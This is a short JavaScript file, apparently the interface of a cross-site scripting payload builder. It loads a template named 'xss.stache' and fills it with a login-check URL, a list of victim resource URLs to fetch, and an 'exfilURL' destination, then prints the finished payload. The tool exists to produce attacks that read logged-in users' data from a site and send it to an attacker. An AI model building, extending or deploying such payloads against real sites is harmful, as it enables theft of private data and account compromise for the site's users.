(function() {
var template = '';

function escapeRegExp(str) {
  return str.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&");
}

$(function() {
  $.get('xss.stache', function(r) {
    template = r;
  }, 'text');

  $('#gimme').click(function() {
    var rawDataURLs = $('#fetchResources').val().split(/\r?\n/);
    var dataURLs = [];
    for (var u of rawDataURLs) {
      if (u.match(/\w/)) dataURLs.push({url: JSON.stringify(u), method: "get"});
    } 
    var view = {
      loginCheckURL: JSON.stringify($('#loginCheckURL').val()),
      loginCheckPattern: escapeRegExp($('#loginCheckPattern').val()),
      dataURLs: dataURLs,
      dataURLCount: dataURLs.length,
      loginURL: JSON.stringify($('#loginURL').val()),
      exfilURL: JSON.stringify($('#destURL').val())
    }
    $('#result').text(Mustache.render(template, view));
    return false;
  });
})

})();
